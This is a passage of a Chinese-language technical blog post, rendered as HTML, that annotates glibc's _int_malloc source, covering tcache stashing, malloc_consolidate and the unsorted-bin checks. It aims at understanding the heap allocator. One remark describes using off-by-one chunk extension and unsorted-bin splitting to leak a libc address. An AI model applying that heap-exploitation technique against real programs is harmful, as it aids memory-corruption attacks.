class="comment">//设置inuse位</span></span><br><span class="line">bin-&gt;bk = bck; <span class="comment">//更改bin的前向与bck的后向。原本的victim被取出，bck变成了该bin中的最后一个chunk</span></span><br><span class="line">bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim); <span class="comment">//设置no_main_arena位</span></span><br><span class="line">check_malloced_chunk (av, victim, nb);    </span><br></pre></td></tr></table></figure><p>然后就是对该small bin中剩下的chunk放入相应idx的tcache bin中,这个操作和之前的fastbin时的操作没有什么区别，只不过从单项链表变成了双向链表而已，以及多了一些chunk标志位的设置。这里不再赘述</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">      stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">        &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        bck = tc_victim-&gt;bk;</span><br><span class="line">        set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (tc_victim);</span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><h6 id="large-bin阶段与malloc-consolidate"><a href="#large-bin阶段与malloc-consolidate" class="headerlink" title="large bin阶段与malloc_consolidate"></a>large bin阶段与malloc_consolidate</h6><p>当上面两个分支都不满足时，就进入了这个分支。如果有fastchunk的话，首先会进行一个<code>malloc_consolidate</code>操作，这个类似一个整理的过程，把碎片化的内存给合并起来，然后放入<code>unsorted bin</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>malloc_consolidate</code>这个函数我们在分析free的时候也会用到，这里我们对它进行一个详细的分析。后面分析free的时候就一笔带过了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line"></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);<span class="comment">//由于consolidate之后没有了fastchunks，所以设置av-&gt;have_fastchunks为false</span></span><br><span class="line"></span><br><span class="line">  unsorted_bin = unsorted_chunks(av);<span class="comment">//获取unsorted bin</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">    then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">    placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">    until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">    reused anyway.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>); <span class="comment">//fastbin数组的尾部</span></span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);<span class="comment">//fastbin数组的头部</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (p)))<span class="comment">//检查对齐</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): &quot;</span></span><br><span class="line">     <span class="string">&quot;unaligned fastbin chunk detected&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)<span class="comment">//检查该fastbin的chunk的size是否符合该bin的idx</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc_consolidate(): invalid chunk size&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_inuse_chunk(av, p);</span><br><span class="line">nextp = REVEAL_PTR (p-&gt;fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">size = chunksize (p);</span><br><span class="line">nextchunk = chunk_at_offset(p, size); <span class="comment">//获取物理相邻的下一个chunk</span></span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//如果物理相邻的上一个chunk不被使用，则进行一个合并</span></span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize; <span class="comment">//合并，size增大</span></span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize)); <span class="comment">//进行一个chunk的扩展，吞并上一个chunk</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p); <span class="comment">//把上一个chunk从它属于的bin链表中unlink下来</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; <span class="comment">//如果后一个chunk不是top chunk</span></span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize); </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//如果物理相邻的后一个chunk不被使用，则把后一个chunk也unlink下来</span></span><br><span class="line">    size += nextsize;</span><br><span class="line">    unlink_chunk (av, nextchunk);</span><br><span class="line">  &#125; <span class="keyword">else</span><span class="comment">//否则的话就把后一个chunk的prev_inuse位置0，表示后一个chunk的前一个chunk(也就是当前chunk)不被使用</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  first_unsorted = unsorted_bin-&gt;fd; <span class="comment">//把合并后的chunk放入unsoeted bin的首位</span></span><br><span class="line">  unsorted_bin-&gt;fd = p;</span><br><span class="line">  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123; <span class="comment">//如果是large bin范围的size的话，还需要设置fd_nextsize等指针</span></span><br><span class="line">    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  p-&gt;bk = unsorted_bin;<span class="comment">//把合并后的chunk放入unsoeted bin的首位</span></span><br><span class="line">  p-&gt;fd = first_unsorted;</span><br><span class="line">  set_foot(p, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123; <span class="comment">//如果是top chunk，则top chunk把前一个chunk 吞并</span></span><br><span class="line">  size += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);<span class="comment">//循环每链表中每一个元素</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);<span class="comment">//循环fastbinY数组</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致过程就如注释所写得，过程比较简单，就是一个对物理相邻的前后的chunk检查然后合并的过程</p><h6 id="unsorted-bin阶段"><a href="#unsorted-bin阶段" class="headerlink" title="unsorted bin阶段"></a>unsorted bin阶段</h6><p>其实注意到刚刚的分支并没有对我们想要的chunk进行一个检索，而只是获得了对应large bin的idx，然后把fastbin中的chunk给整理合并。后面才涉及到一个对unsorted bin以及large bin的一个检索的过程</p><p>首先是这个,获取nb对应的tcache bin的idx，如果tcache存在并且idx合理的话，把<code>tcache_nb</code>赋为<code>nb</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>然后就进入到了一个大循环<code>for(;;)</code>，<strong>其大致结构简要如下所示</strong> 。(后面应该会在int_malloc的开头或者总结中补一个类似这样的流程，以直观看代码结构)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> iters = <span class="number">0</span>; <span class="comment">//循环最大次数</span></span><br><span class="line">    <span class="keyword">while</span>((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="comment">//unsorted bin中进行搜索(其实不止在unsorted bin，后面会详细解释这个循环)</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="keyword">if</span> (return_cached) </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb)) <span class="comment">//large bin中进行搜索</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">    &#123;</span><br><span class="line">        ...<span class="comment">//binmap表等一系列操作</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    use_top:</span><br><span class="line">    ...<span class="comment">// 都没有找到合适的，到top chunk中进行切割</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们首先来看看<code>while((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</code>这个循环</p><p>首先是对victim物理相邻的属性以及在unsorted bin链表中的有效性进行了检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk; <span class="comment">//victim是unsorted bin中最后一个chunk，而bck是它的前一个</span></span><br><span class="line">size = chunksize (victim);</span><br><span class="line">mchunkptr next = chunk_at_offset (victim, size); <span class="comment">//next是victim物理相邻的下一个chunk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ) <span class="comment">//对victim的size大小进行一个检查</span></span><br><span class="line">    || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>); <span class="comment">//对victim的size大小进行一个检查</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)</span><br><span class="line">    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size)) <span class="comment">//对next的prev_size进行检查是否等于victim的size</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim) <span class="comment">//对unsorted bin中的链表有效性进行检查，判断bck的fd是否是victim</span></span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av))) <span class="comment">//对unsorted bin中的链表有效性进行检查,判断victim的fd是不是unsorted bin头</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))<span class="comment">//对next的prev_inuse进行检查</span></span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而后进入这个判断，这是一个切割的过程。</p><p>如果我们请求的大小属于small bin范围，并且unsorted bin中只有victim一个chunk，并且victim是av-&gt;last_remainder，<strong>而且victim在被切成满足给用户请求大小的目标块后，剩余部分大于最小chunk的大小</strong>，就会进行一个切割操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">    only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">    runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">    exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">    no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">    bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">    remainder_size = size - nb; <span class="comment">//获取切割后剩余块的大小</span></span><br><span class="line">    remainder = chunk_at_offset (victim, nb); <span class="comment">//获取剩余块</span></span><br><span class="line">    unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; <span class="comment">//将剩余块链入unsorted bin中</span></span><br><span class="line">    av-&gt;last_remainder = remainder;<span class="comment">// 设置 av-&gt;last_remainder = remainder为剩余块</span></span><br><span class="line">    remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); <span class="comment">//将剩余块链入unsorted bin中</span></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (remainder_size)) <span class="comment">//如果剩余块大小属于large bin，则还需要设置字段</span></span><br><span class="line">      &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//设置一些属性</span></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="comment">//返回给用户</span></span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>顺便提一嘴，这个切割的操作是泄露libc的经典方法。比如我们利用off-by-one进行一个chunk extend，然后free掉放unsorted bin中，然后大切小，通过剩余的chunk泄露libc</p><p>然后是这个,把victim从unsorted bin中取出(我寻思着这个判断是不是多余了?前面不是判断过了吗)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>如果victim的大小刚刚好是我们想要的，则根据是否开启Tcache bin会有两种情况，一个是放入tcache中，设置return_cached为1，然后continue，在下一个循环中调用tcache_get取出，一个是直接返还给用户</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (size == nb)</span><br><span class="line">        &#123;</span><br><span class="line">          set_inuse_bit_at_offset (victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">  We may return one of these chunks later.  */</span></span><br><span class="line">    <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>而后则是根据取出的这个victim的大小，将其放入对应的bin中</p><p>如果这个victim的size属于small bin范围,则会选定<code>bck</code>与<code>fwd</code>如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = smallbin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>否则属于large bin范围，则进入如下分支。这里需要注意large bin的组织形式，不同大小的large chunk之间用<code>fd_nextsize</code>与<code>bk_nextsize</code>组织，而相同大小的large chunk用<code>fd</code>与<code>bk</code>相连。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim_index = largebin_index (size);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"><span class="comment">//判断该large bin是否为空</span></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)<span class="comment">//不为空则进一步操作</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        size |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below 